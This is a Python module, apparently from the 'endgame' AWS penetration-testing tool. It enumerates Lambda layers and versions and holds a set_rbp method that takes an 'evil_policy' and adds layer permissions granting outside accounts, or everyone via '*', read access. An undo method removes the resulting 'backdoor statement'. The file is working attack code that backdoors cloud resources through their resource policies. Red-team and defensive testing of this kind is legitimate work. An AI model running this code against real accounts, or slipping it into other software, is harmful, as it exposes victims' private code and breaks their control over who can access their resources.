import logging
import json
import boto3
from abc import ABC
import botocore
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_resource_path_from_arn, get_account_from_arn
from endgame.shared.policy_document import PolicyDocument
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared import constants
from endgame.shared.utils import get_sid_names_with_error_handling
from endgame.shared.response_message import ResponseMessage
from endgame.shared.list_resources_response import ListResourcesResponse

logger = logging.getLogger(__name__)


class LambdaLayer(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        service = "lambda"
        resource_type = "layer"
        self.name = name.split(":")[0]
        self.version = int(name.split(":")[1])
        super().__init__(self.name, resource_type, service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}:{self.name}:{self.version}"

    @property
    def arn_without_version(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}:{self.name}"

    def _get_rbp(self) -> PolicyDocument:
        # When there is no policy, let's return an empty policy to avoid breaking things
        policy = constants.get_empty_policy()
        print(self.arn)
        try:
            response = self.client.get_layer_version_policy(LayerName=self.name, VersionNumber=self.version)
            policy = json.loads(response.get("Policy"))
        except self.client.exceptions.ResourceNotFoundException as error:
            logger.debug("The Policy does not exist. We will have to add it.")
        except botocore.exceptions.ClientError as error:
            logger.critical(error)
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        return policy_document

    def set_rbp(self, evil_policy: dict) -> dict:
        new_policy_document = PolicyDocument(
            policy=evil_policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        new_policy_json = {
            "Version": "2012-10-17",
            "Statement": []
        }
        current_sids = get_sid_names_with_error_handling(self.original_policy)
        for statement in new_policy_document.statements:
            if statement.sid not in current_sids:
                if ":" in statement.aws_principals[0]:
                    account_id = get_account_from_arn(statement.aws_principals[0])
                    principal = f"arn:aws:iam::{account_id}:root"
                elif "*" == statement.aws_principals[0]:
                    principal = "*"
                else:
                    principal = statement.aws_principals[0]
                self.client.add_layer_version_permission(
                    LayerName=self.arn_without_version,
                    VersionNumber=self.version,
                    StatementId=statement.sid,
                    Action="lambda:GetLayerVersion",
                    Principal=principal,
                )
            new_policy_json["Statement"].append(json.loads(statement.__str__()))
        policy_document = self._get_rbp()
        return policy_document.json

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Wraps client.remove_permission"""
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        message = "404: No backdoor statement found"
        for statement in self.policy_document.statements:
            if statement.sid == constants.SID_SIGNATURE:
                if not dry_run:
                    self.client.remove_layer_version_permission(
                        LayerName=self.name,
                        VersionNumber=self.version,
                        StatementId=statement.sid,
                    )
            else:
                new_policy["Statement"].append(json.loads(statement.__str__()))
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message


class LambdaLayers(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "lambda"
        self.resource_type = "layer"

    @property
    def resources(self):
        """Get a list of these resources"""
        resources = []

        layers = self.layers
        for layer_name in layers:
            versions = self.layer_versions(layer_name)
            resources.extend(versions)
        return resources

    @property
    def arns(self):
        """Get a list of these resources"""
        resources = []

        layers = self.layers
        for layer_name in layers:
            versions = self.layer_version_arns(layer_name)
            resources.extend(versions)
        return resources

    @property
    def layers(self):
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator('list_layers')
        page_iterator = paginator.paginate()
        for page in page_iterator:
            layers = page["Layers"]
            for layer in layers:
                name = layer.get("LayerName")
                arn = layer.get("LayerArn")
                resources.append(name)
        return resources

    def layer_versions(self, layer_name):
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator('list_layer_versions')
        page_iterator = paginator.paginate(
            LayerName=layer_name
        )
        for page in page_iterator:
            layers = page["LayerVersions"]
            for layer in layers:
                version = layer.get("Version")
                layer_version_arn = layer.get("LayerVersionArn")
                name = get_resource_path_from_arn(layer_version_arn)
                resources.append(name)
        return resources

    def layer_version_arns(self, layer_name):
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator('list_layer_versions')
        page_iterator = paginator.paginate(
            LayerName=layer_name
        )
        for page in page_iterator:
            layers = page["LayerVersions"]
            for layer in layers:
                version = layer.get("Version")
                layer_version_arn = layer.get("LayerVersionArn")
                # name = get_resource_path_from_arn(layer_version_arn)
                resources.append(layer_version_arn)
        return resources

    @property
    def resources_v2(self) -> list[ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        layers = self.layers
        for layer_name in layers:
            layer_arns = self.layer_version_arns(layer_name)
            for arn in layer_arns:
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=layer_name)
                resources.append(list_resources_response)
        return resources
